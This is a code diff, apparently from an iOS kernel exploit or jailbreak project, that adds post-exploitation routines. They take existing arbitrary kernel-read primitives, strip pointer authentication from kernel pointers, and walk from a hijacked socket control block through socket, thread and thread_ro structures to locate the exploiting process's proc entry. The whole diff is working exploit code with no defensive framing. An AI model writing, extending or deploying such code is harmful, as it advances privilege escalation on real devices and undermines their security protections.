@@ -33,6 +33,13 @@ static lp_kobject_fn lp_kobject(void) {
 
 static uint64_t lp_kread64(uint64_t a) { return Lum1naLaneKRead64(a); }
 static uint32_t lp_kread32(uint64_t a) { return Lum1naLaneKRead32(a); }
+extern uint64_t cs2_unpac_ptr(uint64_t kptr);
+static BOOL lp_kernel(uint64_t v) { return v >= 0xffff000000000000ULL; }
+static uint64_t lp_ptr(uint64_t a) {
+    uint64_t v = lp_kread64(a);
+    if (!lp_kernel(v)) v = cs2_unpac_ptr(v);
+    return v;
+}
 
 /// A proc candidate is accepted only when pid at +pidOff is ours AND the
 /// proc_ro pointer at +procRoOff is a zone pointer AND the pid still reads
@@ -94,4 +101,34 @@ uint64_t Lum1naFindSelfProc(uint32_t pid, uint32_t pidOff, uint32_t procRoOff,
         @"task 0x%llx scanned 0x1000, no proc with pid %u",
         (unsigned long long)kobj, pid];
     return 0;
+}
+
+uint64_t Lum1naFindSelfProcViaSocket(const LabProcOffTab *po, uint32_t pid,
+                                     uint64_t rwSocketPcb, NSString **how) {
+    if (how) *how = @"none";
+    if (!po || !rwSocketPcb || !po->inpcb_inp_socket ||
+        !po->socket_so_background_thread || !po->thread_t_ro ||
+        !po->thread_ro_proc) {
+        if (how) *how = @"22G100 traversal offsets not pinned";
+        return 0;
+    }
+    uint64_t sock = lp_ptr(rwSocketPcb + po->inpcb_inp_socket);
+    if (!lp_kernel(sock)) { if (how) *how = @"inpcb->socket failed"; return 0; }
+    uint64_t thread = lp_ptr(sock + po->socket_so_background_thread);
+    if (!lp_kernel(thread)) { if (how) *how = @"socket->so_background_thread failed"; return 0; }
+    uint64_t tro = lp_ptr(thread + po->thread_t_ro);
+    if (!lp_kernel(tro)) { if (how) *how = @"thread->t_ro failed"; return 0; }
+    uint64_t proc = lp_ptr(tro + po->thread_ro_proc);
+    if (!lp_kernel(proc)) { if (how) *how = @"thread_ro->proc failed"; return 0; }
+    if (pid && lp_kread32(proc + po->proc_pid) != pid) {
+        if (how) *how = [NSString stringWithFormat:
+            @"proc 0x%llx pid mismatch", (unsigned long long)proc];
+        return 0;
+    }
+    if (how) *how = [NSString stringWithFormat:
+        @"pcb 0x%llx -> socket 0x%llx -> thread 0x%llx -> t_ro 0x%llx -> proc 0x%llx",
+        (unsigned long long)rwSocketPcb, (unsigned long long)sock,
+        (unsigned long long)thread, (unsigned long long)tro,
+        (unsigned long long)proc];
+    return proc;
 }
